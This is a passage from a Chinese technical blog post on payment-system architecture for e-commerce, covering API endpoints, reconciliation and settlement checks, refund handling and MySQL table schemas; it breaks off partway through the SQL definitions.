title="AmazonPay"></a>AmazonPay</h4><p>亚马逊出品，与支付宝非常类似。提供的是集成式的钱包流程。</p><p>支付时直接构建一个url，然后跳转到亚马逊即可完成支付。它还提供一种授权模式，能够不用跳转amazon，再商户端即完成支付。</p><p>支付成功后也会同步跳转，<strong>同步通知</strong> 的内容可以作为支付是否成功的判断依据。经过实际检查 <strong>异步通知</strong> 的到达会稍有延迟，大概10s以内。</p><p>退款方面也支持商户退款单号可以依赖此进行防重。但是退款的状态也是基于异步来的。</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>这其中还有一些国际支付，如：<strong>PayPal</strong>、<strong>GooglePay</strong>、<strong>PayTM</strong> 等知名支付机构没有进行介绍，是因为基本它们的流程也都在上面的模式之中。我们后续的代码结构设计、数据库设计都基于满足上面的各种支付模型来完成设计。</p><p>最后，赠送大家一副脑图，这是接入一家支付时必须弄清楚的问题清单</p><p><img src="/articles/电商设计手册/pay-2.png" alt="pay-2"></p><h2 id="支付系统设计"><a href="#支付系统设计" class="headerlink" title="支付系统设计"></a>支付系统设计</h2><p>文中我们从严谨的角度一步步聊到支付如何演变成独立的系统。内容包括：系统演进过程、接口设计、数据库设计以及代码如何组织的示例。若有不足之处，欢迎讨论共同学习。</p><h3 id="从模块到服务"><a href="#从模块到服务" class="headerlink" title="从模块到服务"></a>从模块到服务</h3><p>我记得最开始工作的时候，所有的功能：加购物车/下单/支付 等逻辑都是放在一个项目里。如果一个新的项目需要某个功能，就把这个部分的功能包拷贝到新的项目。数据库也原封不动的拷贝过来，稍微根据需求改改。</p><p>这就是所谓的 <strong>单体应用</strong> 时代，随着公司产品线开始多元，每条产品线都需要用到支付服务。如果支付模块调整了代码，那么就会处处改动、处处测试。另一方面公司的交易数据割裂在不同的系统中，无法有效汇总统一分析、管理。</p><p>这时就到了系统演进的时候，我们把每个产品线的支付模块抽离成统一的服务。对自己公司内部提供统一的API使用，可以对这些API进一步包装成对应的SDK，供内部业务线快速接入。这里服务使用HTTP或者是RPC协议都可以根据公司实际情况决定。不过如果考虑到未来给第三方使用，建议使用HTTP协议，</p><p><strong>系统的演变过程：</strong></p><p><img src="/articles/电商设计手册/image-20190309104541749.png" alt></p><p>总结下，将支付单独抽离成服务后，带来好处如下：</p><ol><li>避免重复开发，数据隔离的现象出现；</li><li>支付系统周边功能演进更容易，整个系统更完善丰满。如：对账系统、实时交易数据展示；</li><li>随时可对外开发，对外输出Paas能力，成为有收入的项目；</li><li>专门的团队进行维护，系统更有机会演进成顶级系统；</li><li>公司重要账号信息保存一处，风险更小。</li></ol><h3 id="系统能力"><a href="#系统能力" class="headerlink" title="系统能力"></a>系统能力</h3><p>如果我们接手该需求，需要为公司从零搭建支付系统。我们该从哪些方面入手？这样的系统到底需要具备什么样的能力呢？</p><p>首先支付系统我们可以理解成是一个适配器。他需要把很多第三方的接口进行统一的整合封装后，对内部提供统一的接口，减少内部接入的成本。做为一个最基本的支付系统。需要对内提供如下接口出来：</p><ol><li>发起支付，我们取名：<code>/gopay</code></li><li>发起退款，我们取名：<code>/refund</code></li><li>接口异步通知，我们取名：<code>/notify/支付渠道/商户交易号</code></li><li>接口同步通知，我们取名：<code>/return/支付渠道/商户交易号</code></li><li>交易查询，我们取名：<code>/query/trade</code></li><li>退款查询，我们取名：<code>/query/refund</code></li><li>账单获取，我们取名：<code>/query/bill</code></li><li>结算明细，我们取名：<code>/query/settle</code></li></ol><p>一个基础的支付系统，上面8个接口是肯定需要提供的（这里忽略某些支付中的转账、绑卡等接口）。现在我们来基于这些接口看看都有哪些系统会用到。</p><p><img src="/articles/电商设计手册/image-20190309111001880.png" alt></p><p>下面按照系统维度，介绍下这些接口如何使用，以及内部的一些逻辑。</p><h4 id="应用系统"><a href="#应用系统" class="headerlink" title="应用系统"></a>应用系统</h4><p>一般支付网关会提供两种方式让应用系统接入：</p><ol><li>网关模式，也就是应用系统自己需要开发一个收银台；（适合提供给第三方）</li><li>收银台模式，应用系统直接打开支付网关的统一收银台。（内部业务）</li></ol><p>下面为了讲清楚设计思路，我们按照 <strong>网关模式</strong> 进行讲解。</p><p>对于应用系统它需要能够请求支付，也就是调用 <code>gopay</code> 接口。这个接口会处理商户的数据，完成后会调用第三方网关接口，并将返回结果统一处理后返回给应用方。</p><p>这里需要注意，第三方针对支付接口根据我的经验大致有以下情况：</p><ol><li>支付时，不需要调用第三方，按照规则生成数据即可；</li><li>支付时，需要调用第三方多个接口完成逻辑（这可能比较慢，大型活动时需要考虑限流/降配）；</li><li>返回的数据是一个url，可直接跳转到第三方完成支付（wap/pc站）；</li><li>返回的数据是xml/json结构，需要拼装或作为参数传给她的sdk（app）。</li></ol><p>这里由于第三方返回结构的不统一，我们需要统一处理成统一格式，返回给商户端。我推荐使用json格式。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errno"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"ok"</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们把所有的变化封装在 <strong>data</strong> 结构中。举个例子，如果返回的一个url。只需要应用程序发起 <strong>GET</strong> 请求。我们可以这样返回：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errno"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"ok"</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"url"</span>:<span class="string">"xxxxx"</span>,</span><br><span class="line">        <span class="attr">"method"</span>:<span class="string">"GET"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是返回的结构，需要应用程序直接发起 <strong>POST</strong> 请求。我们可以这样返回：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"errno"</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attr">"msg"</span>:<span class="string">"ok"</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"from"</span>:<span class="string">"&lt;form action="</span>xxx<span class="string">" method="</span>POST<span class="string">"&gt;xxxxx&lt;/form&gt;"</span>,</span><br><span class="line">        <span class="attr">"method"</span>:<span class="string">"POST"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 <strong>form</strong> 字段，生成了一个form表单，应用程序拿到后可直接显示然后自动提交。当然封装成 from表单这一步也可以放在商户端进行。</p><p>上面的数据格式仅仅是一个参考。大家可根据自己的需求进行调整。</p><p>一般应用系统除了会调用发起支付的接口外，可能还需要调用 <strong>支付结果查询接口</strong>。当然大多数情况下不需要调用，应用系统对交易的状态只应该依赖自己的系统状态。</p><h4 id="对账系统"><a href="#对账系统" class="headerlink" title="对账系统"></a>对账系统</h4><p>对于对账，一般分为两个类型：<strong>交易对账</strong> 与 <strong>结算对账</strong></p><p><strong>交易对账</strong></p><p>交易对账的核心点是：<strong>检查每一笔交易是否正确</strong>。它主要目的是看我们系统中的每一笔交易与第三方的每一笔交易是否一致。</p><p>这个检查逻辑很简单，对两份账单数据进行比较。它主要是使用 <code>/query/bill</code> 接口，拿到在第三方那边完成的交易数据。然后跟我方的交易成功数据进行比较。检查是否存在误差。</p><p>这个逻辑非常简单，但是有几点需要大家注意：</p><ol><li>我方的数据需要正常支付数据+重复支付数据的总和；</li><li>对账检查不成功主要包括：<strong>金额不对</strong>、<strong>第三方没有找到对应的交易数据</strong>、<strong>我方不存在对应的交易数据</strong>。</li></ol><p>针对这些情况都需要有对应的处理手段进行处理。在我的经验中上面的情况都有过遇到。</p><p><strong>金额不对</strong>：主要是由于第三方的问题，可能是系统升级故障、可能是账单接口金额错误；</p><p><strong>第三方无交易数据：</strong> 可能是拉去的账单时间维度问题（比如存在时差），这种时区问题需要自己跟第三方确认找到对应的时间差。也可能是被攻击，有人冒充第三方异步通知（说明系统校验机制又问题或者密钥泄漏了）。</p><p><strong>自己系统无交易数据：</strong> 这种原因可能是第三方通知未发出或者未正确处理导致的。</p><p>上面这些问题的处理绝大部份都可以依赖 <code>query/trade</code>  <code>query/refund</code> 来完成自动化处理。</p><p><strong>结算对账</strong></p><p>那么有了上面的 <strong>交易对账</strong> 为什么还需要 <strong>结算对账</strong> 呢？这个系统又是干嘛的？先来看下结算的含义。</p><blockquote><p>结算，就是第三方网关在固定时间点，将T+x或其它约定时间的金额，汇款到公司账号。</p></blockquote><p>下面我们假设结算周期是： <strong>T+1</strong>。结算对账主要使用到的接口是 <code>/query/settle</code>，这个接口获取的主要内容是：每一笔结算的款项都是由哪些笔交易组成（交易成功与退款数据）。以及本次结算扣除多少手续费用。</p><p>它的逻辑其实也很简单。我们先从自己的系统按照 <strong>T+1</strong> 的结算周期，计算出对方应该汇款给我们多少金额。然后与刚刚接口获取到的数据金额比较：</p><blockquote><p>银行收款金额 + 手续费 = 我方系统计算的金额</p></blockquote><p>这一步检查通过后，说明金额没有问题。接下来需要检查本次结算下的每一笔订单是否一致。</p><p>结算系统是 <strong>强依赖</strong> 对账系统的。如果对账发现异常，那么结算金额肯定会出现异常。另外结算需要注意的一些问题是：</p><ul><li>银行可能会自行退款给用户，因为用户可直接向自己发卡行申请退款；</li><li>结算也存在时区差问题；</li><li>结算接口中的明细交易状态与我方并不完全一致。比如：银行结算时发现某笔退款完成，但我方系统在进行比较时按照未退款完成的逻辑在处理。</li></ul><p>针对上面的问题，大家根据自己的业务需求需要做一些方案来进行自动化处理。</p><h4 id="财务系统"><a href="#财务系统" class="headerlink" title="财务系统"></a>财务系统</h4><p>财务系统有很多内部业务，我这里只聊与支付系统相关的。（当然上面的对账系统也可以算是财务范畴）。</p><p>财务系统与支付主要的一个关系点在于校验交易、以及退款。这里校验交易可以使用 <code>query/trade</code>  <code>query/refund</code>这两个接口来完成。这个逻辑过程就不需要说了。下面重点说下退款。</p><p>我看到很多的系统退款是直接放在了应用里边，用户申请退款直接就调用退款接口进行退款。这样的风险非常高。支付系统的关于资金流向的接口一定要慎重，不能过多的直接暴露给外部，带来风险。</p><p>退款的功能应该是放到财务系统来做。这样可以走内部的审批流程（是否需要根据业务来），并且在财务系统中可以进行更多检查来觉得是否立即进行退款，或者进入等待、拒绝等流程。</p><h4 id="第三方网关"><a href="#第三方网关" class="headerlink" title="第三方网关"></a>第三方网关</h4><p>针对第三方主要使用到的其实就是异步通知与同步通知两个接口。这一部分的逻辑其实非常简单。就是根据第三方的通知完成交易状态的变更。以及通知到自己对应的应用系统。</p><p>这部分比较复杂的是，第三方的通知数据结构不统一、通知的类型不统一。比如：有的退款是同步返回结果、有的是异步返回结果。这里如何设计会在后面的 <strong>系统设计</strong> 中给出答案。</p><h3 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h3><p>数据的设计是按照：交易、退款、日志 来设计的。对于上面说到的对账等功能并没有。这部分不难大家可以自行设计，按照上面讲到的思路。主要的表介绍如下：</p><ul><li><code>pay_transaction</code> 记录所有的交易数据。</li><li><code>pay_transaction_extension</code> 记录每次向第三方发起交易时，生成的交易号</li><li><code>pay_log_data</code> 所有的日志数据，如：支付请求、退款请求、异步通知等</li><li><code>pay_repeat_transaction</code> 重复支付的数据</li><li><code>pay_notify_app_log</code> 通知应用程序的日志</li><li><code>pay_refund</code> 记录所有的退款数据</li></ul><p><strong>具体的表结构：</strong></p><pre><code class="sql"><span class="comment">-- -----------------------------------------------------</span><span class="comment">-- Table 创建支付流水表</span><span class="comment">-- -----------------------------------------------------</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_transaction`</span> (  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式id，可以用来识别支付，如：支付宝、微信、Paypal等'</span>,  <span class="string">`app_order_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用方订单号'</span>,  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'本次交易唯一id，整个支付系统唯一，生成他的原因主要是 order_id对于其它应用来说可能重复'</span>,  <span class="string">`total_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付金额，整数方式保存'</span>,  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'金额对应的小数位数'</span>,  <span class="string">`currency_code`</span> <span class="built_in">CHAR</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'CNY'</span> <span class="keyword">COMMENT</span> <span class="string">'交易的币种'</span>,  <span class="string">`pay_channel`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'选择的支付渠道，比如：支付宝中的花呗、信用卡等'</span>,  <span class="string">`expire_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'订单过期时间'</span>,  <span class="string">`return_url`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付后跳转url'</span>,  <span class="string">`notify_url`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付后，异步通知url'</span>,  <span class="string">`email`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'用户的邮箱'</span>,  <span class="string">`sing_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'RSA'</span> <span class="keyword">COMMENT</span> <span class="string">'采用的签方式：MD5 RSA RSA2 HASH-MAC等'</span>,  <span class="string">`intput_charset`</span> <span class="built_in">CHAR</span>(<span class="number">5</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'UTF-8'</span> <span class="keyword">COMMENT</span> <span class="string">'字符集编码方式'</span>,  <span class="string">`payment_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'第三方支付成功的时间'</span>,  <span class="string">`notify_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'收到异步通知的时间'</span>,  <span class="string">`finish_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'通知上游系统的时间'</span>,  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方的流水号'</span>,  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'真实给第三方的交易code，异步通知的时候更新'</span>,  <span class="string">`order_status`</span> <span class="built_in">TINYINT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'0:等待支付，1:待付款完成， 2:完成支付，3:该笔交易已关闭，-1:支付失败'</span>,  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建的ip，这可能是自己服务的ip'</span>,  <span class="string">`update_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'更新的ip'</span>,  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="string">`uniq_tradid`</span> (<span class="string">`transaction_id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_trade_no`</span> (<span class="string">`trade_no`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_ctime`</span> (<span class="string">`create_at`</span>)),<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4<span class="keyword">COMMENT</span> = <span class="string">'发起支付的数据'</span>;<span class="comment">-- -----------------------------------------------------</span><span class="comment">-- Table 交易扩展表</span><span class="comment">-- -----------------------------------------------------</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_transaction_extension`</span> (  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'系统唯一交易id'</span>,  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'生成传输给第三方的订单号'</span>,  <span class="string">`call_num`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'发起调用的次数'</span>,  <span class="string">`extension_data`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'扩展内容，需要保存：transaction_code 与 trade no 的映射关系，异步通知的时候填充'</span>,  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'创建ip'</span>,  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_trads`</span> (<span class="string">`transaction_id`</span>, <span class="string">`pay_status`</span>),  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="string">`uniq_code`</span> (<span class="string">`transaction_code`</span>)),<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4<span class="keyword">COMMENT</span> = <span class="string">'交易扩展表'</span>;<span class="comment">-- -----------------------------------------------------</span><span class="comment">-- Table 交易系统全部日志</span><span class="comment">-- -----------------------------------------------------</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_log_data`</span> (  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,  <span class="string">`app_order_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用方订单号'</span>,  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'本次交易唯一id，整个支付系统唯一，生成他的原因主要是 order_id对于其它应用来说可能重复'</span>,  <span class="string">`request_header`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'请求的header 头'</span>,  <span class="string">`request_params`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付的请求参数'</span>,  <span class="string">`log_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'日志类型，payment:支付; refund:退款; notify:异步通知; return:同步通知; query:查询'</span>,  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建ip'</span>,  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_tradt`</span> (<span class="string">`transaction_id`</span>, <span class="string">`log_type`</span>)),<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4<span class="keyword">COMMENT</span> = <span class="string">'交易日志表'</span>;<span class="comment">-- -----------------------------------------------------</span><span class="comment">-- Table 重复支付的交易</span><span class="comment">-- -----------------------------------------------------</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_repeat_transaction`</span> (  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用的id'</span>,  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'系统唯一识别交易号'</span>,  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付成功时，该笔交易的 code'</span>,  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方对应的交易号'</span>,  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式'</span>,  <span class="string">`total_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'交易金额'</span>,  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'小数位数'</span>,  <span class="string">`currency_code`</span> <span class="built_in">CHAR</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'CNY'</span> <span class="keyword">COMMENT</span> <span class="string">'支付选择的币种，CNY、HKD、USD等'</span>,  <span class="string">`payment_time`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方交易时间'</span>,  <span class="string">`repeat_type`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span> <span class="keyword">COMMENT</span> <span class="string">'重复类型：1同渠道支付、2不同渠道支付'</span>,  <span class="string">`repeat_status`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'处理状态,0:未处理；1:已处理'</span>,  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_trad`</span> ( <span class="string">`transaction_id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_method`</span> (<span class="string">`pay_method_id`</span>),  <span class="keyword">INDEX</span> <span class="string">`idx_time`</span> (<span class="string">`create_at`</span>)),<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4<span class="keyword">COMMENT</span> = <span class="string">'记录重复支付'</span>;<span class="comment">-- -----------------------------------------------------</span><span class="comment">-- Table 通知上游应用日志</span><span class="comment">-- -----------------------------------------------------</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_notify_app_log`</span> (  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span 